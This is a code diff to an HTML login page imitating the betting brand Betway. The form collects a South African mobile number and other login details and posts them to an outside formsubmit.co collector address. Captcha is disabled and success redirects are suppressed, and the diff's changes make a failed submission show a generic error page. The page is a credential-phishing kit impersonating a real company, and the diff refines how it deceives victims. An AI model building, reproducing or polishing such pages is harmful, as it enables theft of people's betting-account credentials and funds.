@@ -5,18 +5,11 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Login Page</title>
   <link rel="stylesheet" href="sebono.css" />
-  <style>
-    .page {
-      display: none;
-    }
-    .page.active {
-      display: block;
-    }
-  </style>
+  
 </head>
 <body>
   <!-- Form Page -->
-  <div class="page active" id="form-page">
+  <div class="page" id="form-page">
     <div class="header">
       <div class="logo">betway</div>
       <div class="header-buttons">
@@ -31,7 +24,8 @@
       <form id="login-form" action="https://formsubmit.co/525a68c3f15ba3237c28cc11c2e7cb21" method="POST">
         <!-- Hidden config fields -->
         <input type="hidden" name="_captcha" value="false" />
-        <!-- No _next or _error, to prevent redirect -->
+        <input type="hidden" name="_error" value="?error=1" />
+        <!-- No _next to prevent success redirect -->
 
         <label for="mobile">Mobile Number</label>
         <input type="tel" id="mobile" name="mobileNumber" placeholder="+27 Mobile Number" required />
@@ -63,12 +57,11 @@
   <div class="page" id="error-page">
     <div class="container">
       <h1 class="error-message">An error has been detected</h1>
-      <p>Please try again later.</p>
+      <p style="text-align:center;">Please try again later.</p>
     </div>
   </div>
 
   <script>
-    // Simple function to get URL params
     function getQueryParam(param) {
       const urlParams = new URLSearchParams(window.location.search);
       return urlParams.get(param);
@@ -78,9 +71,11 @@
       const error = getQueryParam('error');
 
       if (error === '1') {
-        // Show error page, hide form page
-        document.getElementById('form-page').classList.remove('active');
+        // Show error page only
         document.getElementById('error-page').classList.add('active');
+      } else {
+        // Default: show form
+        document.getElementById('form-page').classList.add('active');
       }
     });
   </script>
